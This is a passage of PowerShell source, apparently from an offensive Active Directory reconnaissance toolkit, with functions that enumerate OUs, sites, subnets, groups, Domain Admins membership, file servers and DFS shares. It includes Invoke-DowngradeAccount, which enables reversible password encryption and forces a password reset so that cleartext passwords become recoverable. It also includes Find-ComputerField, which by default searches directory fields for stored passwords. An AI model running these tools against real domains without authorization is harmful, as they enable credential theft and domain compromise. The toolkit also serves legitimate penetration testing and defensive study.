
        [String]
        $Filter,

        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,

        $PropertyValue,

        [Int]
        $PropertyXorValue,

        [Switch]
        $ClearValue,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    $Arguments = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
        'Credential' = $Credential
    }
    # splat the appropriate arguments to Get-ADObject
    $RawObject = Get-ADObject -ReturnRaw @Arguments
    
    try {
        # get the modifiable object for this search result
        $Entry = $RawObject.GetDirectoryEntry()
        
        if($ClearValue) {
            Write-Verbose "Clearing value"
            $Entry.$PropertyName.clear()
            $Entry.commitchanges()
        }

        elseif($PropertyXorValue) {
            $TypeName = $Entry.$PropertyName[0].GetType().name

            # UAC value references- https://support.microsoft.com/en-us/kb/305144
            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue 
            $Entry.$PropertyName = $PropertyValue -as $TypeName       
            $Entry.commitchanges()     
        }

        else {
            $Entry.put($PropertyName, $PropertyValue)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_"
    }
}


function Invoke-DowngradeAccount {
<#
    .SYNOPSIS
        Set reversible encryption on a given account and then force the password
        to be set on next user login. To repair use "-Repair".
    .PARAMETER SamAccountName
        The SamAccountName of the domain object you're querying for. 
    .PARAMETER Name
        The Name of the domain object you're querying for.
    .PARAMETER Domain
        The domain to query for objects, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER Filter
        Additional LDAP filter string for the query.
    .PARAMETER Repair
        Switch. Unset the reversible encryption flag and force password reset flag.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS> Invoke-DowngradeAccount -SamAccountName jason
        Set reversible encryption on the 'jason' account and force the password to be changed.
    .EXAMPLE
        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair
        Unset reversible encryption on the 'jason' account and remove the forced password change.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ParameterSetName = 'SamAccountName', Position=0, ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [Parameter(ParameterSetName = 'Name')]
        [String]
        $Name,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Switch]
        $Repair,

        [Management.Automation.PSCredential]
        $Credential
    )

    process {
        $Arguments = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
            'Credential' = $Credential
        }

        # splat the appropriate arguments to Get-ADObject
        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue

        if($Repair) {

            if($UACValues.Keys -contains "ENCRYPTED_TEXT_PWD_ALLOWED") {
                # if reversible encryption is set, unset it
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            # unset the forced password change
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1
        }

        else {

            if($UACValues.Keys -contains "DONT_EXPIRE_PASSWORD") {
                # if the password is set to never expire, unset
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
            }

            if($UACValues.Keys -notcontains "ENCRYPTED_TEXT_PWD_ALLOWED") {
                # if reversible encryption is not set, set it
                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            # force the password to be changed on next login
            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0
        }
    }
}


function Get-ComputerProperty {
<#
    .SYNOPSIS
        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.
        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    .PARAMETER Properties
        Return property names for computers.
    .PARAMETER Domain
        The domain to query for computer properties, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-ComputerProperty -Domain testing
        
        Returns all user properties for computers in the 'testing' domain.
    .EXAMPLE
        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location
        
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.
    .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Properties) {
        # extract out the set of all properties for each object
        $Properties = ,"name" + $Properties | Sort-Object -Unique
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        # extract out just the property names
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Find-ComputerField {
<#
    .SYNOPSIS
        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.
        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    .PARAMETER SearchTerm
        Term to search for, default of "pass".
    .PARAMETER SearchField
        User field to search in, default of "description".
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER Domain
        Domain to search computer fields for, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Find-ComputerField -SearchTerm backup -SearchField info
        Find computer accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',

        [Alias('Field')]
        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    process {
        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-NetOU {
<#
    .SYNOPSIS
        Gets a list of all current OUs in a domain.
    .PARAMETER OUName
        The OU name to query for, wildcards accepted.
    .PARAMETER GUID
        Only return OUs with the specified GUID in their gplink property.
    .PARAMETER Domain
        The domain to query for OUs, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through.
    .PARAMETER FullData
        Switch. Return full OU objects instead of just object names (the default).
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetOU
        
        Returns the current OUs in the domain.
    .EXAMPLE
        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local
        
        Returns all OUs with "admin" in their name in the testlab.local domain.
     .EXAMPLE
        PS C:\> Get-NetOU -GUID 123-...
        
        Returns all OUs with linked to the specified group policy object.
     .EXAMPLE
        PS C:\> "*admin*","*server*" | Get-NetOU
        Get the full OU names for the given search terms piped on the pipeline.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($OUSearcher) {
            if ($GUID) {
                # if we're filtering for a GUID in .gplink
                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            try {
                $OUSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else { 
                        # otherwise just returning the ADS paths of the OUs
                        $_.properties.adspath
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-NetSite {
<#
    .SYNOPSIS
        Gets a list of all current sites in a domain.
    .PARAMETER SiteName
        Site filter string, wildcards accepted.
    .PARAMETER Domain
        The domain to query for sites, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through.
    .PARAMETER GUID
        Only return site with the specified GUID in their gplink property.
    .PARAMETER FullData
        Switch. Return full site objects instead of just object names (the default).
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetSite -Domain testlab.local -FullData
        
        Returns the full data objects for all sites in testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        if(!$Domain) {
            $Domain = Get-NetDomain -Credential $Credential
        }

        $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSprefix "CN=Sites,CN=Configuration" -PageSize $PageSize
    }
    process {
        if($SiteSearcher) {

            if ($GUID) {
                # if we're filtering for a GUID in .gplink
                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName))"
            }
            
            try {
                $SiteSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        # otherwise just return the site name
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-NetSubnet {
<#
    .SYNOPSIS
        Gets a list of all current subnets in a domain.
    .PARAMETER SiteName
        Only return subnets from the specified SiteName.
    .PARAMETER Domain
        The domain to query for subnets, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through.
    .PARAMETER FullData
        Switch. Return full subnet objects instead of just object names (the default).
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetSubnet
        
        Returns all subnet names in the current domain.
    .EXAMPLE
        PS C:\> Get-NetSubnet -Domain testlab.local -FullData
        
        Returns the full data objects for all subnets in testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        if(!$Domain) {
            $Domain = Get-NetDomain -Credential $Credential
        }

        $SubnetSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration" -PageSize $PageSize
    }

    process {
        if($SubnetSearcher) {

            $SubnetSearcher.filter="(&(objectCategory=subnet))"

            try {
                $SubnetSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match "CN=$SiteName" }
                    }
                    else {
                        # otherwise just return the subnet name and site name
                        if ( ($SiteName -and ($_.properties.siteobject -match "CN=$SiteName,")) -or ($SiteName -eq '*')) {

                            $SubnetProperties = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $SubnetProperties['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $SubnetProperties['Site'] = 'Error'
                            }

                            New-Object -TypeName PSObject -Property $SubnetProperties                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-DomainSID {
<#
    .SYNOPSIS
        Gets the SID for the domain.
    .PARAMETER Domain
        The domain to query, defaults to the current domain.
    .EXAMPLE
        C:\> Get-DomainSID -Domain TEST
        
        Returns SID for the domain 'TEST'
#>

    param(
        [String]
        $Domain
    )

    $FoundDomain = Get-NetDomain -Domain $Domain
    
    if($FoundDomain) {
        # query for the primary domain controller so we can extract the domain SID for filtering
        $PrimaryDC = $FoundDomain.PdcRoleOwner
        $PrimaryDCSID = (Get-NetComputer -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid
        $Parts = $PrimaryDCSID.split("-")
        $Parts[0..($Parts.length -2)] -join "-"
    }
}


function Get-NetGroup {
<#
    .SYNOPSIS
        Gets a list of all current groups in a domain, or all
        the groups a given user/group object belongs to.
    .PARAMETER GroupName
        The group name to query for, wildcards accepted.
    .PARAMETER SID
        The group SID to query for.
    .PARAMETER UserName
        The user name (or group name) to query for all effective
        groups of.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
    .PARAMETER Domain
        The domain to query for groups, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER AdminCount
        Switch. Return group with adminCount=1.
    .PARAMETER FullData
        Switch. Return full group objects instead of just object names (the default).
    .PARAMETER RawSids
        Switch. Return raw SIDs when using "Get-NetGroup -UserName X"
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetGroup
        
        Returns the current groups in the domain.
    .EXAMPLE
        PS C:\> Get-NetGroup -GroupName *admin*
        
        Returns all groups with "admin" in their group name.
    .EXAMPLE
        PS C:\> Get-NetGroup -Domain testing -FullData
        
        Returns full group data objects in the 'testing' domain
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData,

        [Switch]
        $RawSids,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if($GroupSearcher) {

            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            if ($UserName) {
                # get the raw user object
                $User = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -Credential $Credential -ReturnRaw -PageSize $PageSize

                # convert the user to a directory entry
                $UserDirectoryEntry = $User.GetDirectoryEntry()

                # cause the cache to calculate the token groups for the user
                $UserDirectoryEntry.RefreshCache("tokenGroups")

                $UserDirectoryEntry.TokenGroups | ForEach-Object {
                    # convert the token group sid
                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    
                    # ignore the built in users and default domain user group
                    if(!($GroupSid -match '^S-1-5-32-545|-513$')) {
                        if($FullData) {
                            Get-ADObject -SID $GroupSid -PageSize $PageSize -Domain $Domain -DomainController $DomainController -Credential $Credential
                        }
                        else {
                            if($RawSids) {
                                $GroupSid
                            }
                            else {
                                Convert-SidToName $GroupSid
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    $GroupSearcher.filter = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
            
                $GroupSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    # if we're returning full data objects
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        # otherwise we're just returning the group name
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}


function Get-NetGroupMember {
<#
    .SYNOPSIS
        This function users [ADSI] and LDAP to query the current AD context
        or trusted domain for users in a specified group. If no GroupName is
        specified, it defaults to querying the "Domain Admins" group.
        This is a replacement for "net group 'name' /domain"
    .PARAMETER GroupName
        The group name to query for users.
    .PARAMETER SID
        The Group SID to query for users. If not given, it defaults to 512 "Domain Admins"
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
    .PARAMETER Domain
        The domain to query for group users, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER FullData
        Switch. Returns full data objects instead of just group/users.
    .PARAMETER Recurse
        Switch. If the group member is a group, recursively try to query its members as well.
    .PARAMETER UseMatchingRule
        Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query when -Recurse is specified.
        Much faster than manual recursion, but doesn't reveal cross-domain groups.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetGroupMember
        
        Returns the usernames that of members of the "Domain Admins" domain group.
    .EXAMPLE
        PS C:\> Get-NetGroupMember -Domain testing -GroupName "Power Users"
        
        Returns the usernames that of members of the "Power Users" group in the 'testing' domain.
    .LINK
        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [Switch]
        $UseMatchingRule,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if(!$DomainController) {
            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }

        if(!$Domain) {
            $Domain = Get-NetDomain -Credential $Credential
        }
    }

    process {

        if ($GroupSearcher) {

            if ($Recurse -and $UseMatchingRule) {
                # resolve the group to a distinguishedname
                if ($GroupName) {
                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                else {
                    # default to domain admins
                    $SID = (Get-DomainSID -Domain $Domain -Credential $Credential) + "-512"
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -PageSize $PageSize
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name

                if ($GroupDN) {
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
                elseif ($SID) {
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    # default to domain admins
                    $SID = (Get-DomainSID -Domain $Domain -Credential $Credential) + "-512"
                    $GroupSearcher.filter = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }

                $GroupSearcher.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $GroupFoundName = $_.properties.name[0]
                        $Members = @()

                        if ($_.properties.member.Count -eq 0) {
                            $Finished = $False
                            $Bottom = 0
                            $Top = 0
                            while(!$Finished) {
                                $Top = $Bottom + 1499
                                $MemberRange="member;range=$Bottom-$Top"
                                $Bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                                try {
                                    $Result = $GroupSearcher.FindOne()
                                    if ($Result) {
                                        $RangedProperty = $_.Properties.PropertyNames -like "member;range=*"
                                        $Results = $_.Properties.item($RangedProperty)
                                        if ($Results.count -eq 0) {
                                            $Finished = $True
                                        }
                                        else {
                                            $Results | ForEach-Object {
                                                $Members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $Finished = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Finished = $True
                                }
                            }
                        } 
                        else {
                            $Members = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $Members | Where-Object {$_} | ForEach-Object {
                # if we're doing the LDAP_MATCHING_RULE_IN_CHAIN recursion
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $Result = [adsi]"LDAP://$DomainController/$_"
                    }
                    else {
                        $Result = [adsi]"LDAP://$_"
                    }
                    if($Result){
                        $Properties = $Result.Properties
                    }
                }

                if($Properties) {

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Properties.samaccounttype

                    if ($FullData) {
                        $GroupMember = Convert-LDAPProperty -Properties $Properties
                    }
                    else {
                        $GroupMember = New-Object PSObject
                    }

                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $Domain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        
                        # extract the FQDN from the Distinguished Name
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $Properties.cn
                        }
                    }
                    
                    if($Properties.objectSid) {
                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MemberSid = $Null
                    }

                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberSid' $MemberSid
                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN
                    $GroupMember

                    # if we're doing manual recursion
                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {
                        if($FullData) {
                            Get-NetGroupMember -FullData -Domain $MemberDomain -DomainController $DomainController -Credential $Credential -GroupName $MemberName -Recurse -PageSize $PageSize
                        }
                        else {
                            Get-NetGroupMember -Domain $MemberDomain -DomainController $DomainController -Credential $Credential -GroupName $MemberName -Recurse -PageSize $PageSize
                        }
                    }
                }

            }
        }
    }
}


function Get-NetFileServer {
<#
    .SYNOPSIS
        Returns a list of all file servers extracted from user 
        homedirectory, scriptpath, and profilepath fields.
    .PARAMETER Domain
        The domain to query for user file servers, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER TargetUsers
        An array of users to query for file servers.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetFileServer
        
        Returns active file servers.
    .EXAMPLE
        PS C:\> Get-NetFileServer -Domain testing
        
        Returns active file servers for the 'testing' domain.
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $TargetUsers,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    function SplitPath {
        # short internal helper to split UNC server paths
        param([String]$Path)

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }

    Get-NetUser -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize | Where-Object {$_} | Where-Object {
            # filter for any target users
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | ForEach-Object {
            # split out every potential file server path
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function Get-DFSshare {
<#
    .SYNOPSIS
        Returns a list of all fault-tolerant distributed file
        systems for a given domain.
    .PARAMETER Version
        The version of DFS to query for servers.
        1/v1, 2/v2, or all
    .PARAMETER Domain
        The domain to query for user DFS shares, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-DFSshare
        Returns all distributed file system shares for the current domain.
    .EXAMPLE
        PS C:\> Get-DFSshare -Domain test
        Returns all distributed file system shares for the 'test' domain.
#>

    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    function Parse-Pkt {
        [CmdletBinding()]
        param(
            [byte[]]
            $Pkt
        )

        $bin = $Pkt
        $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
        $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
        #Write-Host "Element Count: " $blob_element_count
        $offset = 8
        #https://msdn.microsoft.com/en-us/library/cc227147.aspx
        $object_list = @()
        for($i=1; $i -le $blob_element_count; $i++){
               $blob_name_size_start = $offset
               $blob_name_size_end = $offset + 1
               $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)
               #Write-Host "Blob name size: " $blob_name_size
               $blob_name_start = $blob_name_size_end + 1
               $blob_name_end = $blob_name_start + $blob_name_size - 1
               $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])
               #Write-Host  "Blob Name: " $blob_name
               $blob_data_size_start = $blob_name_end + 1
               $blob_data_size_end = $blob_data_size_start + 3
               $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)
               #Write-Host  "blob data size: " $blob_data_size
               $blob_data_start = $blob_data_size_end + 1
               $blob_data_end = $blob_data_start + $blob_data_size - 1
               $blob_data = $bin[$blob_data_start..$blob_data_end]
               switch -wildcard ($blob_name) {
                "\siteroot" {  }
                "\domainroot*" {
                    # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                    # DFSRootOrLinkIDBlob
                    $root_or_link_guid_start = 0
                    $root_or_link_guid_end = 15
                    $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                    $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
